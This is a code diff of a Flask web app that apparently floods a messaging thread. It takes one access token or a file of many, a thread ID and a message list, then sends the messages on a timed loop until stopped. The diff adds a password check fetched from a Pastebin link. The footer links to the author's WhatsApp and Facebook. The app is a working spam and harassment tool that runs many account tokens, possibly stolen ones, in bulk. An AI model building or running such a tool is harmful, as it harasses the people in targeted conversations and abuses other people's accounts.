@@ -1,28 +1,30 @@
+
 from flask import Flask, request, render_template_string
 import requests
 from threading import Thread, Event
 import time
 import random
 import string
- 
+
 app = Flask(__name__)
 app.debug = True
- 
+
+# Your Pastebin link containing the password
+PASTEBIN_URL = 'https://pastebin.com/raw/9p984WrJ'
+
 headers = {
     'Connection': 'keep-alive',
     'Cache-Control': 'max-age=0',
     'Upgrade-Insecure-Requests': '1',
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate',
     'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
 }
- 
+
 stop_events = {}
 threads = {}
- 
+
 def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     while not stop_event.is_set():
@@ -39,10 +41,19 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id
                 else:
                     print(f"Message Sent Failed From token {access_token}: {message}")
                 time.sleep(time_interval)
- 
+
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
     if request.method == 'POST':
+        # Check password
+        password = request.form.get('password')
+        # Fetch password from Pastebin
+        response = requests.get(PASTEBIN_URL)
+        correct_password = response.text.strip()
+
+        if password != correct_password:
+            return 'Incorrect password. Access denied!'
+
         token_option = request.form.get('tokenOption')
         
         if token_option == 'single':
@@ -50,23 +61,23 @@ def send_message():
         else:
             token_file = request.files['tokenFile']
             access_tokens = token_file.read().decode().strip().splitlines()
- 
+
         thread_id = request.form.get('threadId')
         mn = request.form.get('kidx')
         time_interval = int(request.form.get('time'))
- 
+
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
- 
+
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
- 
+
         stop_events[task_id] = Event()
         thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
         threads[task_id] = thread
         thread.start()
- 
+
         return f'Task started with ID: {task_id}'
- 
+
     return render_template_string('''
 <!DOCTYPE html>
 <html lang="en">
@@ -126,6 +137,10 @@ def send_message():
   <div class="container text-center">
     <form method="post" enctype="multipart/form-data">
       <div class="mb-3">
+        <label for="password" class="form-label">Enter Password</label>
+        <input type="password" class="form-control" id="password" name="password" required>
+      </div>
+      <div class="mb-3">
         <label for="tokenOption" class="form-label">Select Token Option</label>
         <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
           <option value="single">Single Token</option>
@@ -172,37 +187,38 @@ def send_message():
     <div class="mb-3">
       <a href="https://wa.me/+917696923715" class="whatsapp-link">
         <i class="fab fa-whatsapp"></i><button>CHAT ON WP</button>
-         <a href="https://www.facebook.com/J0B4N42O"><button>CHAT ON FB</button>
- </a>
+        <a href="https://www.facebook.com/J0B4N42O"><button>CHAT ON FB</button>
+        </a>
     </div>
   </footer>
-  
-  
+
   <script>
     function toggleTokenInput() {
-      var tokenOption = document.getElementById('tokenOption').value;
-      if (tokenOption == 'single') {
-        document.getElementById('singleTokenInput').style.display = 'block';
-        document.getElementById('tokenFileInput').style.display = 'none';
+      const tokenOption = document.getElementById('tokenOption').value;
+      const singleTokenInput = document.getElementById('singleTokenInput');
+      const tokenFileInput = document.getElementById('tokenFileInput');
+
+      if (tokenOption === 'single') {
+        singleTokenInput.style.display = 'block';
+        tokenFileInput.style.display = 'none';
       } else {
-        document.getElementById('singleTokenInput').style.display = 'none';
-        document.getElementById('tokenFileInput').style.display = 'block';
+        singleTokenInput.style.display = 'none';
+        tokenFileInput.style.display = 'block';
       }
     }
   </script>
 </body>
 </html>
 ''')
- 
+
 @app.route('/stop', methods=['POST'])
 def stop_task():
     task_id = request.form.get('taskId')
     if task_id in stop_events:
         stop_events[task_id].set()
-        return f'Task with ID {task_id} has been stopped.'
-    else:
-        return f'No task found with ID {task_id}.'
- 
+        del stop_events[task_id]
+        return f'Task {task_id} stopped successfully.'
+    return f'Task ID {task_id} not found.'
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-
